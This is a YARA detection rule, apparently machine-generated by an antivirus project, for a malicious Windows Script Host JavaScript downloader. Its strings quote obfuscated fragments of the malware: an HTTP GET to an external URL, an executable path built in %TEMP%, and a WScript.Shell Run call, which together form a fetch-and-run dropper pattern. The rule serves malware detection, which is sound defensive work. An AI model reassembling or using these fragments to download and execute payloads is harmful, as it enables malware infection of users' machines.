rule sig_20160329_84dd65cde03887969eab5482fa313566 {
  meta:
    description = "datamaliciousorder - file 20160329_84dd65cde03887969eab5482fa313566.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e1779fd1b9551cc96a22e10e798c5b22173843fc48eade399ae8478a8dcf7f20"

  strings:
    $s1  = "k[hC](\"GET\", \"http://aztechnologies.co.uk/sdj3oa\", false);" fullword ascii
    $s2  = "function m() {return L[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"GAG7RfAjbwmOeg.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[Rh](s() * 11); if (k[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function dg(JP, W0){bK = bK * 1; return JP - W0;};" fullword ascii
    $s5  = "var L = function h() {return WScript[XN](\"WScript.Shell\");}(), FI = 11;" fullword ascii
    $s6  = "function W(){return \"\" + v;};" fullword ascii
    $s7  = "function S(pn){L[\"Run\"](pn, bK, bK);};" fullword ascii
    $s8  = "function e() {return ((tE == true) && (tE == K)) ? 1 : bK;};" fullword ascii
    $s9  = "function s(){return 22;};" fullword ascii
    $s10 = " while (Gm){" fullword ascii
    $s11 = "var AB = new this[\"Date\"]();" fullword ascii
    $s12 = "function yl(OS) {var t = (1, 2, 3, 4, 5, OS); return t;};" fullword ascii
    $s13 = "return dg(LW, x1);" fullword ascii
    $s14 = "function Z(){return XN;};" fullword ascii
    $s15 = "function x()" fullword ascii
    $s16 = "K = true; " fullword ascii
    $s17 = "var K = false;" fullword ascii
    $s18 = "var CD = false;" fullword ascii
    $s19 = "var tE = false;" fullword ascii
    $s20 = "tE = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}